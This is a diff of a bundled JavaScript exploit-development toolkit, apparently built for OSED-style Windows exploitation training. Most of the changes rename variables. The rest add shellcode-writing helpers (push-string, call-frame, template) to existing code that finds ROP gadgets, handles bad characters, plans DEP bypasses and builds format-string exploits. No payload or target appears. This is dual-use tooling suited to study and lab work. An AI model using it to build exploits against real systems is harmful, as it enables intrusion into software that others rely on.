-      exportwalk: (module, symbol, verbose) => wantsHelp(module) ? helperHelp("sc.exportwalk") : renderAndReturn("sc.exportwalk", helper.exportwalk(module, symbol, verbose)),
-      iat: (module, filter) => wantsHelp(module) ? helperHelp("sc.iat") : renderAndReturn("sc.iat", helper.iat(module, filter)),
-      iat_find: (symbol) => wantsHelp(symbol) ? helperHelp("sc.iat_find") : renderAndReturn("sc.iat_find", helper.iat_find(symbol)),
-      iat_ptr: (module, symbol) => wantsHelp(module) ? helperHelp("sc.iat_ptr") : renderAndReturn("sc.iat_ptr", helper.iat_ptr(module, symbol)),
-      api_plan: (target, badchars = []) => helper.apiPlan(target, badchars)
-    };
   }
 
   // src/core/backward_scanner.ts
@@ -15809,19 +16456,19 @@ var osed_bundle = (() => {
     if (b0 === 247) {
       const decoded = decodeModRM(bytes, offset + 1);
       if (!decoded || decoded.rm === void 0) return void 0;
-      const op4 = b1 >> 3 & 7;
-      if (op4 === 2) return { length: 2, mnemonic: `not ${REG_NAMES[decoded.rm]}` };
-      if (op4 === 3) return { length: 2, mnemonic: `neg ${REG_NAMES[decoded.rm]}` };
+      const op5 = b1 >> 3 & 7;
+      if (op5 === 2) return { length: 2, mnemonic: `not ${REG_NAMES[decoded.rm]}` };
+      if (op5 === 3) return { length: 2, mnemonic: `neg ${REG_NAMES[decoded.rm]}` };
       return void 0;
     }
     if (b0 === 255) {
       const decoded = decodeModRM(bytes, offset + 1);
       if (!decoded) return void 0;
-      const op4 = b1 >> 3 & 7;
+      const op5 = b1 >> 3 & 7;
       const operand = decoded.rm !== void 0 ? REG_NAMES[decoded.rm] : decoded.memory;
       if (!operand) return void 0;
-      if (op4 === 2) return { length: 1 + decoded.length, mnemonic: `call ${operand}` };
-      if (op4 === 4) return { length: 1 + decoded.length, mnemonic: `jmp ${operand}` };
+      if (op5 === 2) return { length: 1 + decoded.length, mnemonic: `call ${operand}` };
+      if (op5 === 4) return { length: 1 + decoded.length, mnemonic: `jmp ${operand}` };
       return void 0;
     }
     if (b0 === 217) {
@@ -15833,10 +16480,10 @@ var osed_bundle = (() => {
       if (offset + 2 >= bytes.length) return void 0;
       const decoded = decodeModRM(bytes, offset + 1);
       if (!decoded || decoded.rm === void 0) return void 0;
-      const op4 = b1 >> 3 & 7;
+      const op5 = b1 >> 3 & 7;
       const imm8 = bytes[offset + 2];
       const signed = imm8 > 127 ? imm8 - 256 : imm8;
-      const name = GRP1_NAMES[op4];
+      const name = GRP1_NAMES[op5];
       return { length: 3, mnemonic: `${name} ${REG_NAMES[decoded.rm]}, ${formatHex(signed < 0 ? signed >>> 0 : imm8)}` };
     }
     if (b0 === 129) {
@@ -15845,8 +16492,8 @@ var osed_bundle = (() => {
       const immediateOffset = offset + 1 + decoded.length;
       const imm = signedDword(bytes, immediateOffset);
       if (imm === void 0) return void 0;
-      const op4 = b1 >> 3 & 7;
-      return { length: 1 + decoded.length + 4, mnemonic: `${GRP1_NAMES[op4]} ${REG_NAMES[decoded.rm]}, ${formatHex(imm)}` };
+      const op5 = b1 >> 3 & 7;
+      return { length: 1 + decoded.length + 4, mnemonic: `${GRP1_NAMES[op5]} ${REG_NAMES[decoded.rm]}, ${formatHex(imm)}` };
     }
     for (const entry of ALU_EAX_IMM32) {
       if (b0 === entry.opcode) {
@@ -16178,8 +16825,8 @@ var osed_bundle = (() => {
     const text = value.trim().replace(/`/g, "");
     if (/^-?0x[0-9a-f]+$/i.test(text)) {
       const negative = text.startsWith("-");
-      const hex5 = negative ? text.slice(3) : text.slice(2);
-      const parsed = BigInt(`0x${hex5}`);
+      const hex6 = negative ? text.slice(3) : text.slice(2);
+      const parsed = BigInt(`0x${hex6}`);
       return negative ? -parsed : parsed;
     }
     if (/^-?[0-9]+$/.test(text)) {
@@ -16200,7 +16847,7 @@ var osed_bundle = (() => {
     const signed = (unsigned & signBit) !== BigInt(0) ? unsigned - modulus : unsigned;
     const width = bits / 4;
     const byteCount = bits / 8;
-    const hex5 = `0x${unsigned.toString(16).toUpperCase().padStart(width, "0")}`;
+    const hex6 = `0x${unsigned.toString(16).toUpperCase().padStart(width, "0")}`;
     const littleEndianBytes = [];
     for (let i = 0; i < byteCount; i += 1) {
       const byte = Number(unsigned >> BigInt(i * 8) & BigInt(255));
@@ -16209,11 +16856,11 @@ var osed_bundle = (() => {
     return {
       input: typeof rawValue === "string" ? rawValue : value.toString(),
       bits,
-      hex: hex5,
+      hex: hex6,
       unsigned: unsigned.toString(),
       signed: signed.toString(),
       littleEndianBytes: littleEndianBytes.join(" "),
-      twosComplement: hex5
+      twosComplement: hex6
     };
   }
 
@@ -17574,7 +18221,7 @@ var osed_bundle = (() => {
     const value = [...field.values.exact][0];
     return value > 0 ? "+" + value : String(value);
   }
-  function hex4(value, width) {
+  function hex5(value, width) {
     return "0x" + value.toString(16).toUpperCase().padStart(width, "0");
   }
   function pad2(value, width) {
@@ -17630,7 +18277,7 @@ var osed_bundle = (() => {
         return ((_b2 = (_a2 = left.rva) != null ? _a2 : left.va) != null ? _b2 : BigInt(-1)) < ((_d = (_c2 = right.rva) != null ? _c2 : right.va) != null ? _d : BigInt(-1)) ? -1 : ((_f = (_e = left.rva) != null ? _e : left.va) != null ? _f : BigInt(-1)) > ((_h = (_g = right.rva) != null ? _g : right.va) != null ? _h : BigInt(-1)) ? 1 : left.instructions < right.instructions ? -1 : left.instructions > right.instructions ? 1 : 0;
       });
       const rendered = rows.map((row) => ({
-        va: row.va === void 0 ? "?" : hex4(row.va, addressWidth),
+        va: row.va === void 0 ? "?" : hex5(row.va, addressWidth),
         rva: row.rva === void 0 ? "?" : "+" + row.rva.toString(16).toUpperCase().padStart(Math.max(1, addressWidth - 2), "0"),
         instructions: row.instructions,
         capability: row.capability,
@@ -17646,7 +18293,7 @@ var osed_bundle = (() => {
       lines.push(
         "",
         "MODULE: " + moduleName,
-        "Base: " + ((metadata == null ? void 0 : metadata.base) === void 0 ? "?" : hex4(metadata.base, addressWidth)) + " | ASLR: " + ((metadata == null ? void 0 : metadata.aslr) === "enabled" ? "ON" : (metadata == null ? void 0 : metadata.aslr) === "disabled" ? "OFF" : "?") + " | Gadgets: " + rendered.length,
+        "Base: " + ((metadata == null ? void 0 : metadata.base) === void 0 ? "?" : hex5(metadata.base, addressWidth)) + " | ASLR: " + ((metadata == null ? void 0 : metadata.aslr) === "enabled" ? "ON" : (metadata == null ? void 0 : metadata.aslr) === "disabled" ? "OFF" : "?") + " | Gadgets: " + rendered.length,
         "",
         pad2("VA", widths.va) + "  " + pad2("RVA", widths.rva) + "  " + pad2("INSTRUCTIONS", widths.instructions) + "  " + pad2("CAPABILITY", widths.capability) + "  ESP",
         "-".repeat(widths.va) + "  " + "-".repeat(widths.rva) + "  " + "-".repeat(widths.instructions) + "  " + "-".repeat(widths.capability) + "  " + "-".repeat(widths.esp),
@@ -17781,9 +18428,9 @@ var osed_bundle = (() => {
         byByte.set(entry.byte, list);
       }
       const badSummary = [...byByte.entries()].map(([byte, positions]) => {
-        const hex5 = `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`;
+        const hex6 = `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`;
         const posStr = positions.length === 1 ? `offset ${positions[0]}` : positions.length === positions[positions.length - 1] - positions[0] + 1 ? `offsets ${positions[0]}-${positions[positions.length - 1]}` : `offsets ${positions.join(",")}`;
-        return `${hex5} (${posStr})`;
+        return `${hex6} (${posStr})`;
       }).join(", ");
       return `${mod.name} base ${baseHex} | packed: ${packed} | bad bytes: ${badSummary}. No usable gadget addresses.`;
     } catch (e) {
@@ -17964,6 +18611,9 @@ var osed_bundle = (() => {
       createNopCommand(),
       createRopTemplateCommand(),
       createDepFunctionCommand(),
+      createScPushStringCommand(),
+      createScCallFrameCommand(),
+      createScTemplateCommand(),
       ...createFmtCommands(),
       createExploitCommand(),
       createHelpCommand(registry),
@@ -20511,7 +21161,12 @@ var osed_bundle = (() => {
       lastResult = void 0;
       return true;
     };
-    api.sc = sc;
+    const writer = (name, command2) => (...args) => args.length === 1 && args[0] === "help" ? helperHelp(name) : invoke(command2, args);
+    api.sc = __spreadProps(__spreadValues({}, sc), {
+      push_string: writer("sc.push_string", "sc_push_string"),
+      call_frame: writer("sc.call_frame", "sc_call_frame"),
+      template: writer("sc.template", "sc_template")
+    });
     const analysisAddress = (value) => {
       if (typeof value === "bigint" && value >= BigInt(0)) return value;
       if (typeof value === "number" && Number.isInteger(value) && value >= 0) return BigInt(value);
@@ -20686,6 +21341,14 @@ var osed_bundle = (() => {
         return { api: args[0], module: args[1] };
       case "dep_function":
         return { method: args[0] };
+      case "sc_push_string":
+        return { text: args[0], badchars: args[1], register: args[2] };
+      case "sc_call_frame": {
+        const { rest, bad } = splitBadToken(args.slice(1));
+        return { api: args[0], args: rest, badchars: bad };
+      }
+      case "sc_template":
+        return { tasks: args.map(String) };
       case "fmt_build":
         return {
           writes: [{ addr: args[0], value: args[1] }],
